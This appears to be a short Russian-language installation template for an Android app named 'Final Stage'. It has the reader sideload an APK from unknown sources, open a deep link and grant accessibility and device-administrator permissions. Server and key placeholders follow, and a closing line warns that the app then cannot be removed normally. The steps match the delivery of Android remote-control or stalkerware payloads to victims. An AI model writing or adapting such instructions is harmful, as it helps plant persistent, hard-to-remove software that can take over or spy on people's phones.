Установка приложения «Финальный этап»

1. Скачайте APK: FinalStage.apk

2. Откройте файл и разрешите установку из неизвестных источников.

3. Откройте приложение по ссылке: finalstage://setup

4. В приложении по порядку выдайте разрешения и нажмите СТАРТ.

Сервер: __SERVER__

Ключ: __KEY__

После включения спец. возможностей и прав администратора приложение нельзя удалить обычным способом.
